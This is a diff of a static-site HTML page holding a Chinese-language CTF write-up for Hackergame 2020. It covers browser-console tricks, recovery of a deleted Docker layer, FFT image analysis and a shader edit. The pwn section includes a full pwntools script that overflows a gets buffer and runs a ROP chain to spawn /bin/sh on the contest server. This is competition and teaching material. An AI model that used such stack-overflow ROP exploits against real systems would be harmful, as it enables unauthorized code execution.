@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.3.0">
+<meta name="generator" content="Hexo 5.4.0">
 
 <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
@@ -16,14 +16,14 @@
 
 
 
-<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
-  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
-  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.css">
-  <script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.css">
+  <script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"blog.ofortune.xyz","root":"/","images":"/images","scheme":"Gemini","version":"8.2.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"blog.ofortune.xyz","root":"/","images":"/images","scheme":"Gemini","version":"8.3.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 <meta name="description" content="总的来说这场比赛游戏体验良好，学习到了许多新的知识">
 <meta property="og:type" content="article">
@@ -134,9 +134,6 @@
       <div class="header-inner"><div class="site-brand-container">
   <div class="site-nav-toggle">
     <div class="toggle" aria-label="切换导航栏" role="button">
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
     </div>
   </div>
 
@@ -158,15 +155,6 @@
 
 
 
-<nav class="site-nav">
-  <ul class="main-menu menu">
-        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
-        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
-        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
-        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
-        <li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-globe fa-fw"></i>友情链接</a></li>
-  </ul>
-</nav>
 
 
 
@@ -207,15 +195,13 @@
 <div class="site-state-wrap site-overview-item animated">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">25</span>
+          <a href="/archives">
+          <span class="site-state-item-count">26</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
-          
         <span class="site-state-item-count">45</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
@@ -234,7 +220,7 @@
     </header>
 
     
-  <div class="back-to-top" role="button">
+  <div class="back-to-top" role="button" aria-label="返回顶部">
     <i class="fa fa-arrow-up"></i>
     <span>0%</span>
   </div>
@@ -310,10 +296,10 @@
     
     <div class="post-body" itemprop="articleBody">
         <p>总的来说这场比赛游戏体验良好，学习到了许多新的知识</p>
-<a id="more"></a>
+<span id="more"></span>
 <h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>第一题签到题</p>
 <p>直接<code>F12</code>开发者工具定位到滑动条，将<code>step</code>调整为<code>0.5</code>然后拖动到<code>1</code>得到<code>flag</code></p>
-<p><img data-src="//cdn.ofortune.xyz/ldcraft/images/hackergame2020-1.png" alt="checkin"></p>
+<p><img data-src="/images/hackergame2020-1.png" alt="checkin"></p>
 <h1 id="猫咪问答"><a href="#猫咪问答" class="headerlink" title="猫咪问答++"></a>猫咪问答++</h1><blockquote>
 <ol>
 <li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.</li>
@@ -346,7 +332,7 @@
 <p>找到<span class="exturl" data-url="aHR0cHM6Ly9uZXdzLnVzdGNsdWcub3JnLzIwMTkvMTIvaGFja2VyZ2FtZS0yMDE5Lw==">新闻<i class="fa fa-external-link-alt"></i></span>，共计<code>17098</code>次</p>
 <h1 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h1><p><del>游戏挺好玩的</del></p>
 <p>直接<code>F12</code>审计代码</p>
-<p><img data-src="//cdn.ofortune.xyz/ldcraft/images/hackergame2020-2.png" alt="2048"></p>
+<p><img data-src="/images/hackergame2020-2.png" alt="2048"></p>
 <p>发现<code>html_actuator.js</code>中有关键内容<code>&quot;/getflxg?my_favorite_fruit=&quot; + (&#39;b&#39;+&#39;a&#39;+ +&#39;a&#39;+&#39;a&#39;).toLowerCase();</code>，丢到下方的<code>console</code>中计算得到网址，发送请求后得到<code>flag</code></p>
 <h1 id="一闪而过的-Flag"><a href="#一闪而过的-Flag" class="headerlink" title="一闪而过的 Flag"></a>一闪而过的 Flag</h1><p>很基础，在命令提示符里打开</p>
 <h1 id="从零开始的记账工具人"><a href="#从零开始的记账工具人" class="headerlink" title="从零开始的记账工具人"></a>从零开始的记账工具人</h1><p>我的做法和官方题解<code>解法2</code>一样，进行字符替换</p>
@@ -377,7 +363,7 @@
 <p>这里介绍一个工具<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3dhZ29vZG1hbi9kaXZl">dive<i class="fa fa-external-link-alt"></i></span></p>
 <p>首先使用<code>Dive</code>查看镜像：</p>
 <p>执行命令：<code>docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock wagoodman/dive:latest 8b8d3c8324c7/stringtool</code></p>
-<p><img data-src="//cdn.ofortune.xyz/ldcraft/images/hackergame2020-3.png" alt="dive"></p>
+<p><img data-src="/images/hackergame2020-3.png" alt="dive"></p>
 <p>发现<code>image</code>构建过程中在有一步是删除了<code>flag.txt</code></p>
 <p>由于我的<code>Docker</code>部署在<code>WSL2</code>里面，不方便直接查看镜像文件，所以使用<code>docker image save</code>命令把镜像导出</p>
 <p>我们回到上一步<code>COPY</code>发现镜像</p>
@@ -390,18 +376,18 @@
 <p>使用代码:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line">img = cv.imread(<span class="string">&#x27;4f_system_middle.bmp&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">f = np.fft.fft2(img)</span><br><span class="line">logf = <span class="number">20</span>*np.log(np.abs(f))</span><br><span class="line">plt.imshow(logf, <span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
 <p>运行后得到结果</p>
-<p><img data-src="//cdn.ofortune.xyz/ldcraft/images/hackergame2020-4.png" alt="fft"></p>
+<p><img data-src="/images/hackergame2020-4.png" alt="fft"></p>
 <p>稍微平移拼接一下得到了<code>flag</code></p>
 <h1 id="超简陋的-OpenGL-小程序"><a href="#超简陋的-OpenGL-小程序" class="headerlink" title="超简陋的 OpenGL 小程序"></a>超简陋的 OpenGL 小程序</h1><p>说实话我并不了解<code>OpenGL</code>等图形学内容，但是题目给了<code>basic_lighting.vs</code>文件，看起来内容像是<code>C</code>于是随便改了一下：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#version 330 core</span></span><br><span class="line">layout (location = <span class="number">0</span>) in vec3 aPos;</span><br><span class="line">layout (location = <span class="number">1</span>) in vec3 aNormal;</span><br><span class="line"></span><br><span class="line">out vec3 FragPos;</span><br><span class="line">out vec3 Normal;</span><br><span class="line"></span><br><span class="line">uniform mat4 model;</span><br><span class="line">uniform mat4 view;</span><br><span class="line">uniform mat4 projection;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//FragPos = vec3(model * vec4(aPos, 1.0))</span></span><br><span class="line">    FragPos = vec3(model * vec4(-aPos, <span class="number">1.0</span>));</span><br><span class="line">    Normal = aNormal;</span><br><span class="line">    <span class="comment">//gl_Position = projection * view * vec4(FragPos, 1.0);</span></span><br><span class="line">    gl_Position = projection * view * vec4(FragPos, <span class="number">1.0</span>) + vec4(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>然后借助画图工具翻转一下看到<code>flag</code>为<code>flag&#123;glGraphicsHappy(233);&#125;</code></p>
-<p><img data-src="//cdn.ofortune.xyz/ldcraft/images/hackergame2020-5.png" alt="opengl"></p>
+<p><img data-src="/images/hackergame2020-5.png" alt="opengl"></p>
 <h1 id="生活在博弈树上"><a href="#生活在博弈树上" class="headerlink" title="生活在博弈树上"></a>生活在博弈树上</h1><p>这个题目就是<code>pwn</code>题，审计源码可以发现不安全函数<code>gets</code>。</p>
 <h2 id="始终热爱大地"><a href="#始终热爱大地" class="headerlink" title="始终热爱大地"></a>始终热爱大地</h2><p>直接<code>IDA</code>一把梭打开程序</p>
-<p><img data-src="//cdn.ofortune.xyz/ldcraft/images/hackergame2020-6.1.png" alt="love"></p>
+<p><img data-src="/images/hackergame2020-6.1.png" alt="love"></p>
 <p>我们发现<code>gets</code>读取数据并存放于<code>v12</code>，最后判断输赢的变量存放于<code>v15</code></p>
 <p>而它们具体在哪里？</p>
-<p><img data-src="//cdn.ofortune.xyz/ldcraft/images/hackergame2020-6.2.png" alt="love"></p>
+<p><img data-src="/images/hackergame2020-6.2.png" alt="love"></p>
 <p>向上翻可以看到<code>v12</code>存放于<code>rbp-90h</code>处，<code>v15</code>存放于<code>rbp-1h</code>处，所以我们可以直接构造一个超长字符串使得<code>rbp-1h</code>被覆盖为<code>0x1</code></p>
 <h2 id="升上天空"><a href="#升上天空" class="headerlink" title="升上天空"></a>升上天空</h2><p>题目的意思很明显了，<code>main</code>函数没有开启<code>canary</code>，我们要覆盖掉<code>rbp</code>来<code>getshell</code></p>
 <p>注意到程序是静态链接的，直接使用<code>ROPgadget</code>工具获取<code>ROP</code>链来构造<code>syscall</code></p>
@@ -412,12 +398,12 @@
 <p>我们把<code>step - 5</code>中构造的<code>ROPchain</code>拿来修改一下，加上前面<code>0x90h</code>的填充</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment">#target = process(&#x27;./tictactoe&#x27;)</span></span><br><span class="line">target = remote(<span class="string">&#x27;202.38.93.111&#x27;</span>, <span class="number">10141</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line"><span class="comment">#p = &#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p = (<span class="string">&#x27;1&#x27;</span> * <span class="number">143</span>).encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"><span class="comment"># 第一问</span></span><br><span class="line">p += <span class="string">b&#x27;\x01&#x27;</span></span><br><span class="line">p += (<span class="string">&#x27;1&#x27;</span> * <span class="number">8</span>).encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二问</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000407228</span>)  <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a60e0</span>)  <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000043e52c</span>)  <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;/bin//sh&#x27;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046d7b1</span>)  <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000407228</span>)  <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a60e8</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000439070</span>)  <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046d7b1</span>)  <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004017b6</span>)  <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a60e0</span>)  <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000407228</span>)  <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a60e8</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000043dbb5</span>)  <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a60e8</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000439070</span>)  <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000463af0</span>)  <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000402bf4</span>)  <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">target.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">target.sendline(</span><br><span class="line">    <span class="string">&#x27;144:MEUCIQCGhHgBSLuiv2VMiC2WbvpaBTaUVbKt/UeFDyZ4AY4IKAIgP3mG7PCCKwxX3drRjkbwUlLex7rwNoqoOeUWAejFGWg=&#x27;</span>)</span><br><span class="line">target.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">target.sendline(p)</span><br><span class="line">target.interactive()</span><br></pre></td></tr></table></figure>
 <p>最后执行效果：</p>
-<p><img data-src="//cdn.ofortune.xyz/ldcraft/images/hackergame2020-6.3.png" alt="pwn"></p>
+<p><img data-src="/images/hackergame2020-6.3.png" alt="pwn"></p>
 <h1 id="超安全的代理服务器"><a href="#超安全的代理服务器" class="headerlink" title="超安全的代理服务器"></a>超安全的代理服务器</h1><p>我的做法和官方题解不太一样，我要充分榨干浏览器的功能:smile:</p>
